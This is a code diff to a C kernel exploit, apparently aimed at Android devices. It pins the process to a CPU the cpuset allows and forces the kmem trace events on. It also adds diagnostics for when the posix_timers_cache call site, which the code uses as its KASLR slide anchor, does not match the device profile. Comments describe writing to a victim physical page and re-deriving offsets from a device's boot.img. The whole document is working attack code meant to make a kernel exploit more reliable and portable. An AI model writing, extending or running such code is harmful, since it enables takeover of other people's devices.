@@ -936,12 +936,49 @@ static int wr(const char *p, const char *s)
     close(fd);
     return r < 0 ? -1 : 0;
 }
-static void pin(int cpu)
+static int pin(int cpu)
 {
     cpu_set_t set;
     CPU_ZERO(&set);
     CPU_SET(cpu, &set);
-    sched_setaffinity(0, sizeof(set), &set);
+    return sched_setaffinity(0, sizeof(set), &set);
+}
+
+/*
+ * Pick the CPU the whole run traces on.
+ *
+ * Every capture reads one CPU's trace_pipe_raw, so the allocating process has
+ * to be pinned to that same CPU.  If sched_setaffinity() fails, the
+ * allocations happen elsewhere and read_cpu() returns a buffer they never
+ * touched, which reads exactly like a wrong profile (`site=0 count=0`) while
+ * the page-event discovery still succeeds from unrelated kernel activity.
+ * Vendor cpusets can deny the shell domain the CPU a profile assumes, so fall
+ * back to a CPU the mask actually allows instead of silently tracing the
+ * wrong one.
+ */
+static int pin_trigger_cpu(int want)
+{
+    cpu_set_t set;
+
+    if (!pin(want))
+        return want;
+    CPU_ZERO(&set);
+    if (sched_getaffinity(0, sizeof(set), &set) || !CPU_COUNT(&set))
+    {
+        logf("[!] cannot pin to cpu %d (%s) and cannot read the allowed set; "
+             "tracing cpu %d anyway\n", want, strerror(errno), want);
+        return want;
+    }
+    for (int c = 0; c < CPU_SETSIZE; c++)
+        if (CPU_ISSET(c, &set) && !pin(c))
+        {
+            logf("[!] cannot pin to cpu %d (%s); the allowed set has cpu %d, "
+                 "tracing there instead\n", want, strerror(errno), c);
+            return c;
+        }
+    logf("[!] cannot pin to cpu %d (%s); no allowed cpu accepted the "
+         "affinity, tracing cpu %d anyway\n", want, strerror(errno), want);
+    return want;
 }
 static unsigned u32(const unsigned char *b, size_t o)
 {
@@ -956,15 +993,53 @@ static unsigned long long u64(const unsigned char *b, size_t o)
     return v;
 }
 
+static int rd_file(const char *path, char *buf, size_t cap)
+{
+    int fd = open(path, O_RDONLY);
+    ssize_t r;
+
+    if (fd < 0)
+        return -1;
+    r = read(fd, buf, cap - 1);
+    close(fd);
+    if (r < 0)
+        return -1;
+    buf[r] = 0;
+    return (int)r;
+}
+
+/*
+ * Enable the three kmem events the exploit reads.
+ *
+ * The rss_stat trigger is the documented single-write path, but a failed
+ * write there is silent.  A run that ends up with the page events on and
+ * kmem_cache_alloc off still discovers the page event ids and then reports
+ * `site=0 count=0`, which is indistinguishable from a wrong timer_site.  Read
+ * every event back and fall back to its own `enable` file, naming any event
+ * that stays off.
+ */
 static void enable_events(void)
 {
     static const char *evs[] = {
-        "enable_event:kmem:kmem_cache_alloc\n",
-        "enable_event:kmem:mm_page_free\n",
-        "enable_event:kmem:mm_page_alloc\n",
+        "kmem_cache_alloc",
+        "mm_page_free",
+        "mm_page_alloc",
     };
+
     for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
-        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
+    {
+        char path[192], cmd[128], val[16];
+
+        snprintf(cmd, sizeof(cmd), "enable_event:kmem:%s\n", evs[i]);
+        wr(TR "/events/kmem/rss_stat/trigger", cmd);
+        snprintf(path, sizeof(path), TR "/events/kmem/%s/enable", evs[i]);
+        if (rd_file(path, val, sizeof(val)) > 0 && val[0] == '1')
+            continue;
+        wr(path, "1");
+        if (rd_file(path, val, sizeof(val)) <= 0 || val[0] != '1')
+            logf("[!] kmem:%s is not enabled (%s); captures that need it "
+                 "will read nothing\n", evs[i], path);
+    }
 }
 
 static void drain_cpu(int cpu)
@@ -1092,6 +1167,93 @@ static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
             out[cnt++] = ptr;
     }
     return cnt;
+}
+
+/*
+ * What a failed timer scan actually saw.
+ *
+ * scan_timer_allocs() rejects every record whose call_site low21 differs from
+ * the profile.  That is the right call for the exploit itself, because the
+ * same value is the slide anchor, but it leaves a device with the right slab
+ * geometry and a different kernel text with nothing but `site=0 count=0`.
+ * This second pass drops the site filter so the log can tell the three cases
+ * apart: the event never recorded, the object size is different, or the
+ * profile call site is wrong (and then which call sites the kernel did use).
+ */
+static void explain_timer_scan(const unsigned char *b, size_t n, int pid)
+{
+    enum { MAXK = 64 };
+    unsigned long long key[MAXK];
+    int cnt[MAXK];
+    int nk = 0, total = 0, sized = 0;
+
+    for (size_t i = 8; i + 40 <= n; i += 4)
+    {
+        unsigned long long site, ptr, req, alloc;
+
+        if (u32(b, i - 4) != (unsigned)pid)
+            continue;
+        site = u64(b, i);
+        ptr = u64(b, i + 8);
+        if (!is_kernel_ptr(site) || !is_kernel_ptr(ptr))
+            continue;
+        req = u64(b, i + ALLOC_REQ_OFF);
+        alloc = u64(b, i + ALLOC_REQ_OFF + 8);
+        if (!alloc || alloc < req)
+            continue;
+        total++;
+        if (req != TIMER_ALLOC || alloc != TIMER_ALLOC)
+            continue;
+        sized++;
+        for (int k = 0; k < nk; k++)
+            if (key[k] == site)
+            {
+                cnt[k]++;
+                goto next;
+            }
+        if (nk < MAXK)
+        {
+            key[nk] = site;
+            cnt[nk] = 1;
+            nk++;
+        }
+    next:;
+    }
+
+    if (!total)
+    {
+        logf("[-] the trace holds no kmem_cache_alloc record for pid %d; the "
+             "kmem:kmem_cache_alloc event is not recording on this kernel\n",
+             pid);
+        return;
+    }
+    if (!sized)
+    {
+        logf("[-] %d kmem_cache_alloc records for pid %d, none with bytes_req "
+             "== bytes_alloc == %#llx; posix_timers_cache has a different "
+             "object size here than the profile\n", total, pid,
+             (unsigned long long)TIMER_ALLOC);
+        return;
+    }
+    logf("[-] %d of %d kmem_cache_alloc records are %#llx-byte slab "
+         "allocations, but no call_site has low21 %#llx (conf timer_site="
+         "%#llx)\n", sized, total, (unsigned long long)TIMER_ALLOC,
+         TIMER_SITE_LOW21, STATIC_TIMER_SITE);
+    for (int k = 0; k < nk && k < 4; k++)
+    {
+        int best = -1;
+
+        for (int j = 0; j < nk; j++)
+            if (cnt[j] > 0 && (best < 0 || cnt[j] > cnt[best]))
+                best = j;
+        if (best < 0)
+            break;
+        logf("[-]   observed call_site=%#llx low21=%#llx count=%d\n", key[best],
+             key[best] & 0x1fffffULL, cnt[best]);
+        cnt[best] = -1;
+    }
+    logf("[-] this kernel's text layout differs from the profile's; timer_site "
+         "must be re-derived from this device's boot.img\n");
 }
 
 static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
@@ -1524,6 +1686,9 @@ static unsigned long long calibrate_base(unsigned char *raw)
         int have_si = slabinfo_geometry(&si_order, &si_size, &si_obj,
                                         &si_per) == 0;
 
+        if (c == 0)
+            explain_timer_scan(raw, (size_t)n, me);
+
         /*
          * /proc/slabinfo is authoritative when it is readable: pagesperslab
          * states the SLUB order outright, while the vote below only infers
@@ -1652,9 +1817,15 @@ static unsigned long long calibrate_base(unsigned char *raw)
              made, site0, site0 ? site0 - STATIC_TIMER_SITE : 0, best, bestc,
              best_order, best_size);
         /*
-         * A slabinfo-validated geometry is not a vote: the base is the only
-         * thing calibration has to contribute here, so accept it even when
-         * the vote was weak.  Without slabinfo keep the old floor.
+         * The base is a physical-page anchor, not just a diagnostic: when
+         * pair_slab_pfn() finds no positional page, run_plant() derives the
+         * victim pfn as (V - g_base) >> PAGE_SHIFT and writes there.  A vote
+         * of 1..3 pairs cannot be told apart from a coincidental (slab, page)
+         * pairing, so a slabinfo-confirmed geometry does NOT make such a base
+         * safe to use -- only the geometry is confirmed, never the pairing.
+         * Fail calibration instead; plant_base() (floor 8) recomputes the base
+         * from the real capture on every plant and is the path that is meant
+         * to survive a warm cache.
          */
         if (bestc < 4)
             return 0;
@@ -3159,6 +3330,8 @@ static void run_probe(unsigned char *raw)
     }
     else
     {
+        if (n > 0)
+            explain_timer_scan(raw, (size_t)n, etid);
         logf("[-] probe victim not captured (recs=%d)\n", nrec);
     }
     kill(T, SIGKILL);
@@ -3679,7 +3852,7 @@ int main(int argc, char **argv)
         }
     }
 
-    pin(g_cpu);
+    g_cpu = pin_trigger_cpu(g_cpu);
     logf("[+] pid=%d cpu=%d mode shell=%d fake=%d probe=%d leak=%d ids=%d\n",
          getpid(), g_cpu, shell_mode, g_fake_stage, g_probe, leak_only,
          ids_only);
